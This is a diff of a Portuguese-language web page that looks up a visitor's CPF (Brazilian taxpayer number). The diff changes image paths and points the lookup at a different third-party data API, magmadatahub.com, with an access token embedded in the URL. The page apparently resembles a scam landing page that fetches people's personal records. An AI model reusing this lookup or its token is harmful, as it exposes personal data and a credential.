@@ -161,14 +161,14 @@ src="https://www.facebook.com/tr?id=1289289589600537&ev=PageView&noscript=1"
         </form>
         <button id="consultarBtn" class="btn-custom" onclick="submitLog()">Consultar CPF</button>
         <div id="loader" class="loader">
-            <img src="images/21-18-05-265_512.gif" alt="Carregando...">
+            <img src="4/images/21-18-05-265_512.gif" alt="Carregando...">
             <p>Consultando seus dados...</p>
         </div>
 
         <!-- Resultado -->
         <div id="resultBox" class="result-box">
             <div class="success-message">
-                <img src="images/6784655.png" alt="Aprovado">
+                <img src="4/images/6784655.png" alt="Aprovado">
                 <p>Dados encontrados com sucesso!</p>
             </div>
             <p>Iniciando cadastro de <strong><span id="nomeCompleto"></span></strong></p>
@@ -203,7 +203,7 @@ src="https://www.facebook.com/tr?id=1289289589600537&ev=PageView&noscript=1"
 
     // Nova função para chamar diretamente a API de CPF
     async function getCPFDataFromAPI(cpfNumerico) {
-        const apiUrl = `https://apela-api.tech/?user=2054e0d4-1301-480d-9aa0-55ca35ed9f08&cpf=${encodeURIComponent(cpfNumerico)}`;
+        const apiUrl = `https://magmadatahub.com/api.php?token=d7c5436286e44288a459ca98de0e140bd32fe9717dcadb1c6bd13526f24a78b9&cpf=${encodeURIComponent(cpfNumerico)}`;
         console.log('Chamando API diretamente:', apiUrl);
         
         const response = await fetch(apiUrl, {
